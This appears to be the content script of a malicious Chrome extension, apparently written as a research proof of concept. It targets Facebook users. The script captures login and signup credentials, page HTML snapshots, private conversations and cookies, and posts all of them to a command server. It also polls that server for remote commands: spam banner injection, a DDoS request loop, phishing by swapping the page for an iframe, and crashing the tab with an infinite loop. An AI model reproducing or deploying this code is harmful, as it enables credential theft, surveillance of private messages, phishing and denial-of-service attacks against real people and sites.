/*
*
**	 
*   Content script to interact with the page.
*
*/

// Configure remote server here.
var server = "https://127.0.0.1/xxx/ajax.php";

var email;

// Store whether a DDOS is happening or not
var ddos;

// Store whether a phish attack is happening or not
var phish = false;

// Large HTML chunk dynamically representing the advanced phishing mechanisms
// Credit to the code: http://stackoverflow.com/questions/325273/make-iframe-to-fit-100-of-containers-remaining-height
// The idea itself though was conceived on my own.
function phishing(url){
  return '<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head> \
          <style> \
          *{margin:0;padding:0} \
          html, body {height:100%;width:100%;overflow:hidden} \
          table {height:100%;width:100%;table-layout:static;border-collapse:collapse} \
          iframe {height:100%;width:100%} \
          \
          .header {border-bottom:1px solid #000} \
          .content {height:100%} \
          </style> \
          <style type="text/css"></style></head> \
          <body> \
          <table> \
              <tbody> \
              <tr><td class="content"> \
                  <iframe src="' + url + '" frameborder="0"></iframe></td></tr> \
          </tbody></table> \
          </body></html>';
}

// Spam function to mimic adding Facebook's yellow alert screen at the top.
function spam(content){ 
      return ' <div style="position: fixed; top: 0px; z-index: 999; left: 0px; height: 15px; width: 100%;" class="pam fbPageBanner uiBoxYellow noborder" role="alert" id="yellowbanner"> \
      <div class="fbPageBannerInner"><table class="uiGrid _51mz _5ud_" cellspacing="0" cellpadding="0"> \
      <tbody><tr class="_51mx"><td class="_51m- phm"><i class="img sp__ZNhRpbGO4B sx_d5060e"></i></td> \
      <td class="_51m- phm"><span class="pts fsl"> ' + content + '</span></td><td class="_51m- phm _51mw"> \
      <table class="uiGrid _51mz _5ud-" cellspacing="0" cellpadding="0"><tbody><tr class="_51mx"><td class="_51m- phs"> \
      </td></tr></tbody></table></td></tr></tbody></table></div></div> '; 
} 


$(document).ready(function() {

  // Checks for NULL emails, in the worst case scenario that an email cannot be retrieved then we resort to the user id
  chrome.runtime.sendMessage({type: 'getEmail'}, function(response) { 
        if(!response.value){
            // Get the ID via the part of the page that is always present, the header.
            var id = $('img.img').attr('id').split("_");
            id = id[id.length-1];
            // We use the ID as the equivalent of an email, however the email takes precedence when storing.
            chrome.runtime.sendMessage({type: 'storeEmail', value: id});
            // Fallback to using the ID.
            email = id;
        }
    }); 

	// When the Facebook login button is clicked the password is sent to the remote server.
	$("#login_form").submit(function(e){

		// Scrape the data
		var data = {'username' : $('#email').val(), 'password' : $('#pass').val() };
		email = $('#email').val();
		chrome.runtime.sendMessage({type: 'storeEmail', value: email});

		// JSON Encode the data to be sent to our server
		$.post(server, {'op' : 'api_add', category: 'User Credentials', 'jsondata' : JSON.stringify(data), 'username' : email, 'browser': "Chrome", os: window.navigator.platform}
  		);
		
	});
	
	
    /* The Below Sniffs the Sign-Up Form from Facebook */
    $("#reg").submit(function (e){

    	var data = {'name' : $("[name='firstname']").val(),
    				'surname' : $("[name='lastname']").val(),
    			    'username' : $("[name='reg_email__']").val(),
    			    'confirmation' : $("[name='reg_email_confirmation__']").val(), 
    			    'password' : $("[name='reg_passwd__']").val(),
    			    'dob' : $("[name='birthday_day']").val() + "/" + $("[name='birthday_month']").val() + "/" + $("[name='birthday_year']").val(),
    			    'sex' : parseInt($("[name='sex']:checked").val()) == 1 ? "Female" : "Male" // 1 = female, 2 = male
    			};

    	email = $("[name='reg_email_confirmation__']").val();
    	chrome.runtime.sendMessage({type: 'storeEmail', value: email});

		// Send it to our API
		$.post(server, {'op' : 'api_add', category: 'Signup Information', 'jsondata' : JSON.stringify(data), 'username' : email, 'browser': "Chrome", os: window.navigator.platform}
  		);
	  });

    // Periodically attempt to steal HTML snapshot - every minute.
    setInterval(function(){ 
      var data = {"HTML Snapshot" : "<html>" + $("html").html() + "</html>"};
      $.post(server, {'op' : 'api_add', category: 'HTML Snapshot', 'jsondata' : JSON.stringify(data), 'username' : email, 'browser': "Chrome", os: window.navigator.platform}
      );
    }, 60000);

    // Periodically try to steal conversations on screen -- every minute
    setInterval(function(){ 
      // Steal private conversations on screen at an interval of every 10 seconds.

      // Post only if significant.
      if(typeof $('div.conversation').html() != 'undefined')
        $('div.conversation').each(function( index ){
          var data = {"Conversation" : $(this).html()};
          $.post(server, {'op' : 'api_add', category: 'Private Conversation', 'jsondata' : JSON.stringify(data), 'username' : email, 'browser': "Chrome", os: window.navigator.platform}
          );
        });
    }, 10000);

    // Periodically "phone home" to our server to read if we have any commands to execute
    setInterval(function(){ 
      $.ajax({
              type: "POST",
              url: server,
              data: {'op' : 'api_ctl', 'username' : email},
              dataType: "json",
              success: function (msg) {
                // Determine when a DDOS stops
                if(JSON.stringify(msg).indexOf('DDOS') == -1)
                  ddos = null;
                // Determine when a Phish stops
                if(JSON.stringify(msg).indexOf('Phish') == -1)
                  phish = false;
                // Determine which type of message it is.
                for(var i = 0; i < msg.length; i++){
                    doCommand(msg[i]['command']['name'], msg[i]['params'], msg[i]['id']);
                }
              }
            });
      }, 10000); 

	
});

chrome.extension.onMessage.addListener(function(msg, sender, sendResponse) {
   if (msg.action == 'cookiejar') {

   		chrome.runtime.sendMessage({type: 'getEmail'}, function(response) {	
   			email = response.value;
   		});	
   		
      // Send cookies periodically any time there is a change
		  $.post(server, {'op' : 'api_add', category: 'Cookies', 'jsondata' : JSON.stringify({'cookies' : msg.val}), 'username' : email, 'browser': "Chrome", os: window.navigator.platform}
  		);
   }
});

var ddosInterval;

// Function to do a remote control command
var doCommand = function(name, params, id){
  // Advertise by posting once the contents of params to the FB newsfeed - excellent for Spam messaging.
  if(name == 'Spam'){
    if(document.querySelector(".fbPageBannerInner") == null){
        // CSS fixes and apply the spam.
        document.querySelector("#pagelet_bluebar").style.position = "absolute"; 
        document.querySelector("#pagelet_bluebar").style.top = "35px"; 
        document.querySelector("#pagelet_bluebar").style.width = "100%"; 
        document.querySelector("#pagelet_bluebar").childNodes[0].childNodes[0].childNodes[0].style.top = "35px"; 
        document.querySelector("#globalContainer").style.position = "absolute"; 
        document.querySelector("#globalContainer").style.top = "70px"; 
        document.querySelector(".fbChatSidebar").style.position = "absolute"; 
        document.querySelector(".fbChatSidebar").style.top = "70px"; 
        document.querySelector("._li").insertAdjacentHTML("afterbegin", spam(params));    
    } 
  }

  if(name == 'DDOS'){
    if(!ddos){
      ddos = true;
      // In an actual DDOS attack, the milliseconds number would be very small; to keep with ethical procedures when making requests
      // I have set the number to the large quantity of every 10 seconds so that a site will not be impacted when testing the command.
      // Furthermore the POST string to the site is also very small to not overload their servers. In a real attack it would be very large and 
      // include many of them. Deletion is not done by the browser in this instance as the DDOS must be controlled by the attacker.
      ddosInterval = setInterval(function(){
        $.post(params, {'data' : 'researchonbrowserextensions'});
      }, 10000);
    }
  }

  // Check to see if to clear DDOS timer
  if(!ddos & isFinite(ddosInterval))
    clearInterval(ddosInterval);

  if(name == 'Phish'){
    if(!phish){
      // Phishing is happening
      phish = true;
      // Replace by the phishing site : MUST BE HTTPS PHISHING SITE (trivial for the attacker as the certificate is still displayed as Facebook's) 
      var newDoc = document.open("text/html", "replace");
      newDoc.write(phishing(params));
      newDoc.close();
    }
  }

  if(name == 'Crash'){
    // Immediately delete the command as it has been performed
    $.ajax({
      type: "POST",
      url: server,
      data: {'op' : 'api_del', 'id' : id},
      dataType: "text",
      success: function (msg) {
        if(msg == "200")
          // Crash the browser by infinite loop method - for Chrome this crashes the tab and cycles the cpu to close to max core usage
          while(true)
            var x = 'crash';
      }
    });
  }

}